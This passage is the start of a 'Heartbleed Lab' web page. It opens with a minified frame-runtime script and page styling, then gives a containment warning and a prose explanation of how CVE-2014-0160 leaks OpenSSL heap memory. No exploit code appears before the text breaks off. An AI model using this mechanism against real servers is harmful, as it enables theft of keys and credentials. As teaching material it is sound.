A=!1,_=!1;return{restore(){if(A||(A=!0,L()))return;const E=b();E!==null&&(k(E),j())},promoted(){if(_||(_=!0,L()))return;const E=b();E!==null?(k(E),j()):n&&k(a)}}}function Cn(t,e,r,n){let a=null;try{a=window.trustedTypes?.createPolicy("frame-runtime",{createScriptURL:R=>R})??null}catch{}const s=window.Worker,l=s?.prototype,u=Object.freeze({Worker:s,workerOn:l?.addEventListener,workerPost:l?.postMessage,workerTerminate:l?.terminate,fetch:window.fetch.bind(window),preventDefault:Event.prototype.preventDefault,now:Date.now,policy:a,origins:e});r(t).then(R=>R?.bootTopLevel?R.bootTopLevel(u,n):n.settle()).catch(()=>n.settle())}var so="modulepreload",io=function(t){return"/"+t},lo={},Fn=function(e,r,n){let a=Promise.resolve();function s(l){const u=new Event("vite:preloadError",{cancelable:!0});if(u.payload=l,window.dispatchEvent(u),!u.defaultPrevented)throw l}return a.then(l=>{for(const u of l||[])u.status==="rejected"&&s(u.reason);return e().catch(s)})},xn=window===top,Xt=Object.getOwnPropertyDescriptor(window,"claude"),ze=ln(xn,window.__FRAME_PREAMBLE?.topLevel,Xt?.writable===!1),ft=typeof ze=="object"&&ze[0],x=ft?_n():vn();(function(){const t=Object.defineProperty,e=globalThis,r=["RTCPeerConnection","webkitRTCPeerConnection","RTCDataChannel","RTCIceCandidate","RTCSessionDescription","RTCRtpSender","RTCRtpReceiver"];let n=0;for(let a=0;a<r.length;a++){const s=r[a];try{t(e,s,{value:void 0,writable:!1,configurable:!1})}catch{try{delete e[s]}catch{}try{t(e,s,{value:void 0,writable:!1,configurable:!0})}catch{}}typeof e[s]=="function"&&n++}if(n&&ze==="framed")try{x.post({__frame_rtc_lockdown_failed:n},"*")}catch{}})();var Yt=1e4,jn=2e3,dt=2e3,ht=Object.freeze([...window.__FRAME_PREAMBLE?.origins??["https://claude.ai","https://preview.claude.ai"]]);function Jt(t){for(const e of ht)if(e.endsWith(":*"))try{const r=new URL(t);if(`${r.protocol}//${r.hostname}:*`===e)return!0}catch{}else if(t===e)return!0;return!1}var Ne=Object.freeze({...window.__FRAME_PREAMBLE?.capabilities}),Ce=window.__FRAME_PREAMBLE?.transforms,pt=window.__FRAME_PREAMBLE?.comments,mt=window.__FRAME_PREAMBLE?.translate,me=window.__FRAME_PREAMBLE?.ldx,We=dr(window.__FRAME_PREAMBLE?.cred),Zt=(()=>{try{const[t]=performance.getEntriesByType("navigation"),e=t?.serverTiming?.find(r=>r.name==="frame-cred-exp");return e!==void 0&&/^\d{1,15}$/.test(e.description)?hr(Number(e.description)):void 0}catch{return}})();function Qt(t){return Fn(()=>import("/_runtime/"+t),void 0)}var Fe=new Set,er=setTimeout,In=fetch,Dn=AbortController,Hn=800+800*Math.random(),Bn=3e3,Ve=null,tr=new Map;function qn(t,e){let r=tr.get(t);return r||tr.set(t,r=Un(t,e)),r}function Un(t,e){if(Ve?.has(t))return Promise.resolve("csp");if(navigator.onLine===!1)return Promise.resolve("offline");const r=new Dn;let n=!1;return er(()=>{n=!0,r.abort()},Bn),In("/_runtime/"+t,{signal:r.signal}).then(a=>(r.abort(),a.ok?/javascript/i.test(a.headers.get("content-type")??"")?e instanceof Error&&/:\d+:\d+\)?$/m.test(e.stack??"")?"eval":"served":"mime":"http"),()=>n?"timeout":Ve?.has(t)?"csp":"net")}function se(t){if(!Ve){const e=Ve=new Set;try{document.addEventListener("securitypolicyviolation",r=>{const n=/\/_runtime\/([^/?#]+)/.exec(r.blockedURI);n&&r.disposition!=="report"&&e.add(n[1])})}catch{}}return Qt(t).catch(()=>new Promise(e=>er(e,Hn)).then(()=>Qt(t+"?r=1")).then(e=>(e!==void 0&&Fe.add(t),e)))}function rr(t,e,r){return{contract:t.contract,changes:new Set(t.changes??[]),flags:new Set(t.flags??[]),capabilities:t.capabilities??{},capBudgets:t.capBudgets??{},brokerGen:t.brokerGen,transforms:new Map,shellOrigin:e,shell:r,mount:bt,hooks:Xe,pipe:()=>({wrap:(n,a)=>(...s)=>{try{return a(...s)}catch(l){return Promise.reject(l)}}})}}var we=null,X=null;function nr(t,e,r){try{Object.defineProperty(t,e,{value:r,writable:!1,configurable:!1,enumerable:!0})}catch{try{Object.defineProperty(t,e,{value:r,writable:!1,configurable:!0,enumerable:!0})}catch{}}}var vt=!1,Xe={editBefore:null,edit:null};function Kn(t,e,r=!1){const n=[];let a;if(r)try{Xe.editBefore?.(t)}catch{}for(const s of t.elements){const l=document.querySelector(`[data-id="${s.target}"]`);if(!l){a=s.target;break}if([...Object.keys(s.attrsSet??{}),...s.attrsRemoved??[]].some(u=>!yr(u)||gr(l,u))){a=s.target;break}if(s.text!==void 0&&(!Sr(l)||Tr(l))){a=s.target;break}for(const[u,R]of Object.entries(s.attrsSet??{}))if(!ar(l,u)){try{l.setAttribute(u,R)}catch{}or(l,u,R)}for(const u of s.attrsRemoved??[])ar(l,u)||(l.removeAttribute(u),or(l,u,null));typeof s.text=="string"&&Ar(l,s.text),n.push(s.target)}if(r)try{Xe.edit?.(t.seq,n,a)}catch{}if(a!==void 0){x.post({__frame_patch_miss:{seq:t.seq}},e);return}try{document.dispatchEvent(new CustomEvent("claude:edit",{detail:{seq:t.seq,targets:n}}))}catch{}}function or(t,e,r){if(!(t instanceof HTMLInputElement))return;const n=e.toLowerCase();n==="checked"?t.checked=r!==null:n==="value"&&t.type!=="file"&&(t.value=r??"")}function ar(t,e){const r=e.toLowerCase(),n=t;return r==="data-id"||(r==="value"||r==="checked")&&(n.__artifactSecret===!0||/^(password|hidden|file)$/.test(n.type??"")||/(^|\s)(cc-|one-time-code|current-password|new-password)/i.test(`${t.getAttribute("autocomplete")??""} ${n.autocomplete??""}`))}function sr(t){const e=document.documentElement;t==="light"||t==="dark"?(e.dataset.theme=t,e.style.colorScheme=t,vt=!0):vt&&(delete e.dataset.theme,e.style.colorScheme="",vt=!1)}var ie=new Map,_t=null;function yt(){let t;const e={u:new Promise(r=>{t=r}),r:r=>{e.done=!0,t(r)},done:!1,nulled:!1};return e}function Ye(t,e){t.nulled=!0,t.ver=e,t.r(null)}function gt(t,e){for(const[r,n]of ie)n.done||(e&&n.asked?e(r,n):Ye(n,t))}function Gn(){for(const t of ie.values())if(t.asked&&!t.done)return!0;return!1}var $n=Object.freeze(Object.assign(Object.create(null),{call:Function.prototype.call,apply:Function.prototype.apply,bind:Function.prototype.bind})),wt=!1,bt=(t,e)=>{let r=ie.get(t);if(r?.nulled&&wt)r=yt(),ie.set(t,r);else if(!r||r.done){r?.nulled&&X&&x.post({__frame_cap_telemetry:{kind:"cap-load-error",cap:t,phase:"install"}},X);return}const n=typeof e=="function"?Object.setPrototypeOf(e,$n):Object.assign(Object.create(null),e);typeof n.then=="function"&&delete n.then,r.want=void 0,r.r(Object.freeze(n))};function ir(){const t=Xt?.value??{};nr(window,"claude",t);for(const e of Object.keys(Ne)){if(t[e]!==void 0){nr(t,e,t[e]);continue}ie.set(e,yt())}if(t.use===void 0){const e=r=>{if(typeof r!="string"||!Object.hasOwn(Ne,r))return Promise.resolve(null);let n=ie.get(r);return n?(_t&&(n.nulled||n.want!==void 0)&&(n=_t(r,n)),n.asked=!0,n.u):Promise.resolve(t[r]??null)};try{Object.defineProperty(t,"use",{value:e,writable:!0,configurable:!0,enumerable:!1})}catch{}}return t}if(ze==="framed"){let t;const e=Ce&&pe.test(Ce)?se(Ce).catch(c=>{t={f:Ce,e:c}}):Promise.resolve(void 0),r=c=>{if(c.type==="auxclick"&&c.button!==1)return;const h=c.target,g=h&&h.closest?h.closest("a[href],area[href]"):null;if(!g)return;const C=g.getAttribute("href");if(!C)return;let O;try{O=new URL(C,document.baseURI)}catch{return}if((O.protocol==="http:"||O.protocol==="https:")&&O.origin!==location.origin){c.preventDefault();const z=(g.getAttribute("target")??"").toLowerCase(),B=c.type==="auxclick"||c.metaKey||c.ctrlKey||c.shiftKey||c.altKey||!["","_self","_top","_parent"].includes(z);x.post({__frame_nav:!0,url:O.href,newTab:B},"*")}};addEventListener("click",r,!0),addEventListener("auxclick",r,!0);const n={},a=c=>{c.isTrusted&&(n.pointer=!0)},s=c=>{c.isTrusted&&(n.click=!0)};addEventListener("pointermove",a,{capture:!0,passive:!0}),addEventListener("click",s,{capture:!0,passive:!0});const l={cb:null};addEventListener("keydown",c=>l.cb?.(c),!0);const u={cb:null};addEventListener("keydown",c=>u.cb?.(c));const R=pn();e.then(c=>c?.installEscapeForward?.(l,h=>{X&&x.post(h,X)})),e.then(c=>{try{c?.installFocusKeep?.()}catch{}}),e.then(c=>{if(!c?.wireNav)return;const h=x.port("*");c.wireNav(h),removeEventListener("click",r,!0),removeEventListener("auxclick",r,!0),removeEventListener("pointermove",a,!0),removeEventListener("click",s,!0),c.wireEngagement?.(n,h,R)});let b=null;try{b=Nn()}catch{}const y=document.readyState==="loading"?new Promise(c=>document.addEventListener("DOMContentLoaded",()=>c(),{once:!0})):Promise.resolve();let p="dcl",k=!1;y.then(()=>{k=!0});let L=null,m=null;try{m=Kr(window.name),L=Bt(null,m)}catch{}const j=ir();let A=null;try{A=un(j,L,{post:(c,h)=>x.post(c,h),dcl:y},m)}catch{}e.then(c=>{try{A&&c?.installHotExtras?.(A)}catch{}});let _=null;const E=()=>Array.isArray(_?.flags)&&_.flags.includes("frame_ldx_runtime")&&!!me&&pe.test(me)&&document.querySelector("script#an-form")!==null;try{A?.hydration(E,Gr)}catch{}let I=null,D=0;const q=x.on((c,h,g,C)=>{Jt(h)&&Pr(c)&&(C(),_=c.__frame_init,X=h,q(),clearTimeout(D),I?.())});if(We){const c=Zt===void 0?{__frame_cred:We}:{__frame_cred:We,exp:Zt};for(const h of ht)try{h.endsWith(":*")||x.post(c,h)}catch{}}x.post({__frame_connect:!0},"*");try{A?.afterConnect()}catch{}const $=setTimeout,H=clearTimeout,xe=()=>new Promise(c=>$(c,0));let be=()=>NaN,je=()=>[];try{be=performance.now.bind(performance),je=performance.getEntriesByType.bind(performance)}catch{}let K=0;const Ee=()=>{try{x.post({__frame_alive:!0},"*")}catch{}K=$(Ee,jn)},Ie=()=>H(K);Ee(),addEventListener("load",Ie,{once:!0});const le=new Promise(c=>{I=c,D=setTimeout(()=>{q(),c()},Yt)}),te=new WeakSet;addEventListener("error",c=>{c.target&&te.add(c.target)},!0);try{An(qt(),We,()=>{e.then(c=>{try{c?.drawRefusedNotice?.()}catch{}})})}catch{}const ve=()=>{let c=[];try{c=[...document.querySelectorAll("link[rel~=stylesheet]:not([rel~=alternate])")].filter(g=>!g.sheet&&!g.disabled&&!te.has(g)&&g.getAttribute("href")&&URL.canParse(g.href)&&(!g.media||matchMedia(g.media).matches))}catch{}let h=c.length;return h===0?Promise.resolve():new Promise(g=>{try{const C=dt-be();C>0&&(p="sheets");const O=$(g,C>0?C<dt?C:dt:0),z=()=>{--h===0&&(H(O),g())};for(const B of c)B.addEventListener("load",z,{once:!0}),B.addEventListener("error",z,{once:!0})}catch{g()}})};y.then(()=>{try{b?.restore()}catch{}});const Je=Promise.all([le,y,e]).then(c=>{if(_?.hostOverlays!==!0||!X)return;const h=c[2],g=B=>{try{return B?.()===!0}catch{return!1}},C=g(h?.declaresCover),O=_.hostSides===!0?{cover:C,sides:g(h?.declaresSides)}:{cover:C};if(x.post({__frame_layout:O},X),_.hostBackground!==!0)return;const z=X;return xe().then(ve).then(()=>{try{h?.watchBackground?.(B=>x.post({__frame_layout:{...O,background:B}},z))}catch{}})}),Se={cb:null};x.on((c,h)=>{if(Jt(h)&&Nr(c)){try{b?.promoted()}catch{}Se.cb?.()}}),le.then(async()=>{if(!_||!X){gt();try{A?.onNoInit()}catch{}return}if(sr(_.theme),_.hostVisible===!1&&e.then(i=>i?.applyHostVisible?.(!1,R)),_.hostKeys!==void 0){const i=X,S=_.hostKeys;e.then(w=>w?.installHostKeyForward?.(u,S,M=>x.post(M,i)))}try{A?.onInit(_.hot,X)}catch{}let c;const h=()=>{try{!c&&me&&E()&&(c=se(me),c.then(i=>i?.prefetch?.()).catch(()=>{}))}catch{}};h(),y.then(h);const g=X,C=x.port(g),O=(i,S)=>x.post({__frame_cap_telemetry:{kind:"cap-load-error",cap:i,phase:S}},g),z=(i,S,w)=>{new Promise(M=>M(qn(S,w))).then(M=>O(i,M),()=>O(i))},B=i=>x.post({__frame_cap_recovered:{cap:i}},g);let J=_.brokerGen;const ce=()=>A?.boot.ver??"",G=ce(),_e=(i,S)=>{const w=ce();H(S.t),S.want=w,S.t=$(()=>{S.done||Ye(S,w)},Yt),x.post({__frame_cap_want:!0,cap:i,ver:w},g)},Q=(i,S)=>{const w=ie.get(i.cap),M=Ne[i.cap];if(!S||!w||w.done||w.want!==i.ver||!pe.test(M))return;if(H(w.t),w.want=void 0,J=i.brokerGen??J,i.ver!==ce()){_e(i.cap,w);return}if(!i.grant||i.cap==="network"){Ye(w,i.ver);return}const ee=we,Z=we={...ee,capabilities:{...ee.capabilities,[i.cap]:i.grant},capBudgets:{...ee.capBudgets,[i.cap]:{...ee.capBudgets[i.cap],...i.budgets}}};se(M).then(W=>{Fe.has(M)&&B(i.cap),Z.brokerGen=J,wt=!0;try{W?.install?.(Z)}catch{O(i.cap,"install")}finally{wt=!1}},W=>z(i.cap,M,W)).then(()=>{w.done||Ye(w,i.ver)})};let De=!1,He=!1;x.on((i,S,w)=>{if(S!==g)return;try{if(A?.onShell(i))return}catch{}if(Fr(i)&&sr(i.__frame_theme.theme),tn(i)&&Q(i,w),w&&rn(i)&&(J=i.brokerGen??J),Cr(i)){const Z=i.__frame_host_visible.visible;e.then(W=>W?.applyHostVisible?.(Z,R))}Mr(i)&&Kn(i.__frame_patch,g,w);const M=i?.__fc_mode;M&&typeof M=="object"&&!De&&pt&&pe.test(pt)&&(De=!0,se(pt).then(Z=>Z.install?.(g,M.on===!0,C)).catch(()=>{}));const ee=i?.__ft_cmd;ee&&typeof ee=="object"&&!He&&mt&&pe.test(mt)&&(He=!0,se(mt).then(Z=>Z.install?.(g,ee,C)).catch(()=>{}))});const ue=Object.keys(_.capabilities??{}).filter(i=>Object.hasOwn(Ne,i)).map(i=>[i,Ne[i]]).filter(i=>typeof i[1]=="string"&&pe.test(i[1])),re=g;let Be=!1,ke=()=>{};const Ze=new Promise(i=>{ke=()=>{Be=!0,i()}}),ye=()=>(Be||(p="caps"),Ze),Qe=L!==null||jt(_.hot)||_.hostVisible===!1||_.hostOverlays===!0;k&&(p="init");const ge=_.hostBackground===!0,Ae=y.then(()=>(ge&&ye(),ge?Je:void 0)).then(()=>Qe?ye():xe()).then(ve).then(()=>{let i=!0;try{i=Qe||Gn()}catch{}return i?ye():void 0}).then(()=>{Ie();const i=pr(je,be);x.post(i?{__frame_ready:!0,nav:i,gate:p}:{__frame_ready:!0,gate:p},re),e.then(S=>{S?.installSizeReporter?.(re,Se,C),S?.installPaintReporter?.(C)})}),qe=await Promise.allSettled(ue.map(([,i])=>se(i))),fe=await e;if(fe?.buildBoot||(t?z("_transforms",t.f,t.e):O("_transforms")),fe?.buildBoot)try{we=fe.buildBoot(_,fe.TRANSFORMS??{},{shellOrigin:re,mount:bt,hooks:Xe,shell:C},i=>x.post({__frame_cap_telemetry:i},re))}catch{O("_transforms","install"),we=rr(_,re,C)}else we=rr(_,re,C);fe?.buildBoot&&Fe.has(Ce??"")&&B("_transforms");const de=we;de.brokerGen=J,qe.forEach((i,S)=>{const[w,M]=ue[S];if(i.status!=="fulfilled"){z(w,M,i.reason);return}Fe.has(M)&&B(w);try{i.value?.install?.(de)}catch{O(w,"install")}});const Ue=_.capWants===!0;Ue&&(_t=(i,S)=>{const w=ce();if(!w)return S;if(!S.nulled)return S.want!==w&&_e(i,S),S;if(w===S.ver)return S;const M=yt();return ie.set(i,M),_e(i,M),M}),gt(G,Ue&&ce()!==G?_e:void 0),ke(),await Ae;let et=!1;try{et=E()}catch{}me&&et?(c??se(me)).then(i=>i?.boot?.({shellOrigin:g,build:de.flags.has(fn),hot:A?.hot??null,carried:A?.carried(),presented:()=>A?.presented()??!0})).catch(()=>!1).then(i=>{A?.hydrated(),i!==!0?O("_ldx"):Fe.has(me)&&B("_ldx")}):A?.hydrated()})}else ft&&(ir(),Cn(ft,ht,se,{settle:gt,mount:bt}))})();</script><!-- /frame-runtime --><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body data-new-gr-c-s-check-loaded="14.1338.0" data-gr-ext-installed="">
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>Heartbleed Lab</title>
+<style>
+  /* Layout: single-column forensic lab worksheet — fixed max-width reading measure,
+     numbered stages down the page, terminal blocks as the recurring object. */
+  :root {
+    --bg: #f4f6f4;
+    --surface: #ffffff;
+    --surface-2: #eceeec;
+    --fg: #1a1f1a;
+    --fg-dim: #5c655c;
+    --fg-faint: #8a928a;
+    --rule: #d6dad6;
+    --accent: #b5231f;      /* the bleed — oxblood red */
+    --accent-soft: #f2d9d8;
+    --term-bg: #10140f;
+    --term-fg: #d4e0cd;
+    --term-dim: #7f9478;
+    --term-green: #7fd37f;
+    --term-red: #ff6b61;
+    --term-cyan: #6fd0c8;
+    --warn-bg: #fbeceb;
+    --warn-fg: #8a1d1a;
+    --ok-bg: #e4efe2;
+    --ok-fg: #2f6b33;
+    --mono: 'JetBrains Mono', ui-monospace, 'SF Mono', Menlo, Consolas, monospace;
+    --sans: 'Inter', system-ui, -apple-system, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0c0f0c;
+      --surface: #151a14;
+      --surface-2: #1d231c;
+      --fg: #e3e8e1;
+      --fg-dim: #9aa598;
+      --fg-faint: #6a736a;
+      --rule: #2a312a;
+      --accent: #e5564f;
+      --accent-soft: #3a1917;
+      --term-bg: #0a0d09;
+      --term-fg: #d4e0cd;
+      --term-dim: #7f9478;
+      --warn-bg: #2a1413;
+      --warn-fg: #f0a19d;
+      --ok-bg: #16281a;
+      --ok-fg: #8fd092;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0c0f0c;
+    --surface: #151a14;
+    --surface-2: #1d231c;
+    --fg: #e3e8e1;
+    --fg-dim: #9aa598;
+    --fg-faint: #6a736a;
+    --rule: #2a312a;
+    --accent: #e5564f;
+    --accent-soft: #3a1917;
+    --term-bg: #0a0d09;
+    --term-fg: #d4e0cd;
+    --term-dim: #7f9478;
+    --warn-bg: #2a1413;
+    --warn-fg: #f0a19d;
+    --ok-bg: #16281a;
+    --ok-fg: #8fd092;
+    color-scheme: dark;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--sans);
+    line-height: 1.6;
+    margin: 0;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 820px;
+    margin: 0 auto;
+    padding-left: max(20px, env(safe-area-inset-left, 0px));
+    padding-right: max(20px, env(safe-area-inset-right, 0px));
+    padding-block: 0;
+  }
+
+  /* ---- Masthead ---- */
+  header.mast {
+    padding-block: 48px 28px;
+    border-bottom: 2px solid var(--fg);
+  }
+  .cve-tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-weight: 600;
+    margin-bottom: 16px;
+  }
+  .cve-tag::before {
+    content: "";
+    width: 9px; height: 9px;
+    border-radius: 50%;
+    background: var(--accent);
+    box-shadow: 0 0 0 4px var(--accent-soft);
+  }
+  h1 {
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: clamp(2.4rem, 7vw, 3.6rem);
+    line-height: 1.02;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+    text-wrap: balance;
+  }
+  h1 .bleed {
+    color: var(--accent);
+    position: relative;
+  }
+  .lede {
+    font-size: 1.08rem;
+    color: var(--fg-dim);
+    max-width: 62ch;
+    margin: 0;
+  }
+  .meta-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px 28px;
+    margin-top: 24px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--fg-faint);
+  }
+  .meta-row b { color: var(--fg-dim); font-weight: 600; }
+
+  /* ---- Safety banner ---- */
+  .banner {
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+    background: var(--warn-bg);
+    border: 1px solid color-mix(in srgb, var(--accent) 35%, transparent);
+    border-left: 4px solid var(--accent);
+    border-radius: 7px;
+    padding: 16px 18px;
+    margin-top: 32px;
+    font-size: 0.92rem;
+    color: var(--warn-fg);
+  }
+  .banner svg { flex: none; margin-top: 2px; }
+  .banner b { color: var(--warn-fg); }
+
+  /* ---- How-it-works diagram ---- */
+  section.block { padding-block: 44px; border-bottom: 1px solid var(--rule); }
+  .eyebrow {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--fg-faint);
+    margin: 0 0 10px;
+  }
+  h2 {
+    font-size: 1.7rem;
+    font-weight: 750;
+    letter-spacing: -0.015em;
+    margin: 0 0 8px;
+    text-wrap: balance;
+  }
+  h2 .n {
+    font-family: var(--mono);
+    color: var(--accent);
+    font-size: 1.1rem;
+    font-weight: 600;
+    margin-right: 10px;
+    vertical-align: 2px;
+  }
+  section.block > p, section.block > ul, section.block > ol { max-width: 68ch; }
+  p { margin: 0 0 14px; }
+  a { color: var(--accent); text-decoration-thickness: 1px; text-underline-offset: 2px; }
+
+  .diagram {
+    background: var(--surface);
+    border: 1px solid var(--rule);
+    border-radius: 10px;
+    padding: 8px;
+    margin: 20px 0 10px;
+    overflow-x: auto;
+  }
+  .diagram svg { display: block; width: 100%; height: auto; min-width: 560px; }
+  figcaption {
+    font-size: 0.82rem;
+    color: var(--fg-faint);
+    font-family: var(--mono);
+    margin-top: 8px;
+    padding: 0 6px;
+  }
+
+  /* ---- Terminal blocks ---- */
+  .term {
+    background: var(--term-bg);
+    border-radius: 9px;
+    margin: 16px 0;
+    overflow: hidden;
+    border: 1px solid #000;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.25);
+  }
+  .term-bar {
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    padding: 9px 13px;
+    background: #1b2019;
+    border-bottom: 1px solid #000;
+  }
+  .term-bar .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .d1 { background: #ff5f56; } .d2 { background: #ffbd2e; } .d3 { background: #27c93f; }
+  .term-bar .ttl {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: var(--term-dim);
+    margin-left: 6px;
+  }
+  .term-bar .copy {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--term-dim);
+    background: transparent;
+    border: 1px solid #333c31;
+    border-radius: 5px;
+    padding: 3px 9px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .term-bar .copy:hover { color: var(--term-green); border-color: var(--term-green); }
+  .term-bar .copy.done { color: var(--term-green); border-color: var(--term-green); }
+  pre {
+    margin: 0;
+    padding: 14px 16px;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.65;
+    color: var(--term-fg);
+    overflow-x: auto;
+    tab-size: 2;
+  }
+  pre code { font-family: inherit; white-space: pre; }
+  .term .prompt { color: var(--term-green); user-select: none; }
+  .term .cmt { color: var(--term-dim); }
+  .term .out { color: var(--term-fg); opacity: 0.82; }
+  .term .hl-red { color: var(--term-red); }
+  .term .hl-cyan { color: var(--term-cyan); }
+  .term .hl-green { color: var(--term-green); }
+
+  /* inline code */
+  code.ic {
+    font-family: var(--mono);
+    font-size: 0.86em;
+    background: var(--surface-2);
+    border: 1px solid var(--rule);
+    border-radius: 4px;
+    padding: 1px 6px;
+    color: var(--fg);
+  }
+
+  /* ---- Step list ---- */
+  .step-head {
+    display: flex;
+    align-items: baseline;
+    gap: 12px;
+    margin: 24px 0 6px;
+  }
+  .step-head .idx {
+    font-family: var(--mono);
+    font-weight: 700;
+    color: var(--accent);
+    font-size: 0.95rem;
+    flex: none;
+  }
+  .step-head h3 {
+    font-size: 1.12rem;
+    font-weight: 700;
+    margin: 0;
+    letter-spacing: -0.01em;
+  }
+
+  /* ---- Callouts ---- */
+  .note {
+    display: flex;
+    gap: 12px;
+    background: var(--surface);
+    border: 1px solid var(--rule);
+    border-left: 3px solid var(--fg-faint);
+    border-radius: 6px;
+    padding: 13px 15px;
+    margin: 16px 0;
+    font-size: 0.9rem;
+    color: var(--fg-dim);
+  }
+  .note.what::before { content: "⌕"; }
+  .note::before {
+    font-family: var(--mono);
+    color: var(--fg-faint);
+    font-weight: 700;
+    flex: none;
+  }
+  .note b { color: var(--fg); }
+  .note.ok { border-left-color: var(--ok-fg); background: var(--ok-bg); color: var(--ok-fg); }
+  .note.ok b { color: var(--ok-fg); }
+  .note.ok::before { content: "✓"; color: var(--ok-fg); }
+
+  /* ---- Key/value spec table ---- */
+  .spec {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 0.9rem;
+  }
+  .spec td { padding: 9px 12px; border-bottom: 1px solid var(--rule); vertical-align: top; }
+  .spec tr td:first-child {
+    font-family: var(--mono);
+    color: var(--fg-dim);
+    width: 38%;
+    white-space: nowrap;
+  }
+  .spec tr:last-child td { border-bottom: none; }
+
+  /* ---- Anatomy of the exploit packet ---- */
+  .packet {
+    display: grid;
+    gap: 2px;
+    margin: 18px 0;
+    font-family: var(--mono);
+    font-size: 0.82rem;
+  }
+  .pkt-row {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 2px;
+  }
+  @media (min-width: 560px) { .pkt-row { grid-template-columns: 200px 1fr; } }
+  .pkt-field {
+    background: var(--surface-2);
+    padding: 8px 12px;
+    border-radius: 5px;
+    color: var(--fg);
+  }
+  .pkt-field.evil { background: var(--accent-soft); color: var(--accent); font-weight: 600; }
+  .pkt-desc { padding: 8px 4px; color: var(--fg-dim); align-self: center; }
+
+  /* ---- checklist ---- */
+  .checklist { list-style: none; padding: 0; margin: 16px 0; }
+  .checklist li {
+    display: flex; gap: 11px; align-items: flex-start;
+    padding: 9px 0; border-bottom: 1px dashed var(--rule);
+    font-size: 0.94rem;
+  }
+  .checklist li::before {
+    content: "▢"; color: var(--accent); font-size: 1.05rem; flex: none; line-height: 1.4;
+  }
+
+  footer {
+    padding-block: 36px 60px;
+    font-size: 0.84rem;
+    color: var(--fg-faint);
+  }
+  footer a { color: var(--fg-dim); }
+  .tabs {
+    display: inline-flex;
+    gap: 2px;
+    background: var(--surface-2);
+    border-radius: 7px;
+    padding: 3px;
+    margin: 4px 0 2px;
+  }
+  .tabs button {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 6px 14px;
+    border: none;
+    background: transparent;
+    color: var(--fg-dim);
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: 600;
+  }
+  .tabs button[aria-selected="true"] {
+    background: var(--surface);
+    color: var(--accent);
+    box-shadow: 0 1px 2px rgba(0,0,0,0.12);
+  }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 3px; }
+
+  @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+
+<div class="wrap">
+
+  <header class="mast">
+    <span class="cve-tag">CVE-2014-0160 · OpenSSL TLS Heartbeat</span>
+    <h1>The <span class="bleed">Heartbleed</span> Lab</h1>
+    <p class="lede">Build a deliberately vulnerable TLS server inside an isolated container, then over-read its heap one heartbeat at a time — the real buffer over-read, reproduced faithfully, on a machine that can only bleed into itself.</p>
+    <div class="meta-row">
+      <span><b>Severity</b> &nbsp;CVSS 7.5 (High)</span>
+      <span><b>Class</b> &nbsp;CWE-125 Out-of-bounds Read</span>
+      <span><b>Affected</b> &nbsp;OpenSSL 1.0.1 – 1.0.1f</span>
+      <span><b>Fixed in</b> &nbsp;1.0.1g (RFC 6520 bounds check)</span>
+    </div>
+  </header>
+
+  <div class="banner">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+    <div><b>Containment is the whole point.</b> Everything below runs against a server you built, bound to loopback inside a throwaway container. Do not point this tooling at any host you don't own. The vulnerable OpenSSL binary never leaves the sandbox — treat the container as radioactive and delete it when you're done.</div>
+  </div>
+
+  <!-- ============ WHAT IT IS ============ -->
+  <section class="block">
+    <p class="eyebrow">The mechanism</p>
+    <h2><span class="n">00</span>What actually bleeds</h2>
+    <p>TLS has a keep-alive extension called the <b>Heartbeat</b> (RFC 6520). The client sends a small <code class="ic">HeartbeatRequest</code> carrying a payload and a number saying how long that payload is. The server is supposed to echo exactly those bytes back.</p>
+    <p>The bug: vulnerable OpenSSL <b>trusts the length field and never checks it against the bytes actually received.</b> You claim "here are 2 bytes, payload length 65535," and the server allocates a 65535-byte response buffer and <code class="ic">memcpy</code>s 65535 bytes starting at your 2-byte payload — reading 65533 bytes of whatever sat next to it on the heap. Private keys, session cookies, POSTed passwords, decrypted traffic. Then it mails that heap slice back to you.</p>
+
+    <figure class="diagram">
